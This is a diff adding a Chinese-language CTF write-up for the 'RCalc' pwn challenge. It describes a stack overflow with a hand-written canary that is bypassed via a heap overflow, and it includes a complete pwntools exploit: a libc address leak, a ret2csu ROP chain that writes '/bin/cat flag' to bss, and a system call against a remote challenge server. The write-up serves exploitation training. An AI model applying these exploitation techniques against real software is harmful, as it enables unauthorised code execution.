@@ -1875,3 +1875,107 @@ if __name__ == '__main__':
     # pause()
     io.interactive()
 ```
+
+
+### 20. RCalc
+题目：暂无
+
+思路：通过逆向分析发现再输入名字的时候存在栈溢出，但是这里存在一个手写的canary保护机制。另外在保存结果的时候没有数量限制，会导致堆溢出，可以覆盖保存canary的堆块，从而绕过第一个漏洞点的栈溢出保护，再通过常规的ROP进行利用即可。
+
+#### scanf输入字符串的特性
+对于下面的代码，当输入字符串中包含\t,\r,\n时，scanf会中断，但是遇到\x00时会继续输入，输入完成后会在字符串后加0，如果字符串长度为0不会加0。测试发现输入为0x09(\t)-0x0d(\r)（9-13）之间的任意值都会导致输入中断，因此这里进行溢出的时候payload中不能包含这些特殊字符。
+```c
+char s[128];
+scanf("%s", s);
+```
+
+#### system("/bin/sh")执行错误？
+看了其他的wp，都是通过泄露__lib_start_main函数的地址，然后得到libc中system函数和/bin/sh的地址，最后调用system("/bin/sh")得到flag。但是实际运行发现报错，错误为
+```bash
+sh: 1: \x8a\xfa\xff: not found
+sh: 1: \xff\x10\xfa\xff\xb0a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff\x8a\xfa\xff@\x8a\xfa\xffЈ\xfa\xff\xa8\x89\xfa\xff@\x8a\xfa\xffЈ\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff@\x8a\xfa\xff: not found
+Input your name pls: [*] Got EOF while reading in interactive
+```
+猜测可能是题目给的环境存在点问题，但是既然存在溢出那总是有办法获取到flag的，可以调用/bin/cat flag，最原始的还可以使用open、read系统调用的方式读取flag。这里我用了pppppp和mmmcall方式构造了一段read函数调用，将/bin/cat flag写入到bss段，然后执行system得到flag，这里关键在于read函数的got地址中包含0x20,需要变换之后绕过去。全部源代码如下：
+```python
+from pwn import *
+from LibcSearcher import *
+
+elf = ELF('RCalc')
+libc = ELF('libc.so.6')
+
+debug = False
+if debug:
+    io = process('./RCalc', env={"LD_PRELOAD" : "./libc.so.6"})
+else:
+    io = remote('220.249.52.134', 58208)
+
+pop_rdi = 0x401123
+mainAddr = 0x401036
+pppppp = 0x40111A
+mmmcall = 0x401100
+
+def passCanary():
+    for _ in range(35):
+        io.sendlineafter('choice:', '1')
+        io.sendlineafter('integer: ', '0')
+        io.sendline('0')
+        data = io.sendlineafter('result? ', 'yes')
+        print(data)
+    io.sendlineafter('choice:', '5')
+
+if __name__ == '__main__':
+    # leak __libc_start_main
+    payload = b'\x00' * 0x110
+    payload += p64(0)
+    payload += p64(pop_rdi)
+    payload += p64(elf.got['__libc_start_main'])
+    payload += p64(elf.plt['printf'])
+    payload += p64(mainAddr)
+    io.sendlineafter('pls: ', payload)
+    passCanary()
+    data = io.recvuntil('pls: ')
+    print(data)
+    __libc_start_main = u64(data.split(b'Input')[0].ljust(8, b'\x00'))
+    log.success('__libc_start_main: 0x%x' % __libc_start_main)
+
+    # calc system address
+    libcBase = __libc_start_main - libc.sym['__libc_start_main']
+    systemAddr = libcBase + libc.sym['system']
+    readAddr = libcBase + libc.sym['read']
+    binshAddr = libcBase + next(libc.search(b'/bin/sh\x00'))
+    log.success('system: 0x%x' % systemAddr)
+    log.success('read: 0x%x' % readAddr)
+    log.success('binsh: 0x%x' % binshAddr)
+
+
+    # read /bin/sh to bss
+    payload = b'\x00' * 0x110
+    payload += p64(0)
+    # gdb.attach(io, gdbscript='''
+    # b *0x401022''')
+    # read /bin/ls to bss
+    log.info('bss: 0x%x' % elf.bss())
+    log.info('bss: 0x%x' % (elf.bss()+0x500))
+    payload += p64(pppppp) + p64(0x400) + p64(0x401) + p64(0x600050) + p64(14) + p64(elf.bss() + 0x500) + p64(0) + p64(mmmcall) + b'\x00'*56 + p64(mainAddr)
+    io.sendline(payload)
+    # pause()
+    passCanary()
+    io.send(b'/bin/cat flag\x00')
+    data = io.recvuntil('pls: ')
+    print(data)
+
+    payload = b'\x00' * 0x110
+    payload += p64(0)
+    payload += p64(pop_rdi)
+    payload += p64(elf.bss() + 0x500)
+    # payload += p64(binshAddr)
+    payload += p64(systemAddr)
+    payload += p64(mainAddr)
+    io.sendline(payload)
+
+    passCanary()
+    io.interactive()
+    # data = io.recvuntil('pls: ')
+    # print(data)
+```
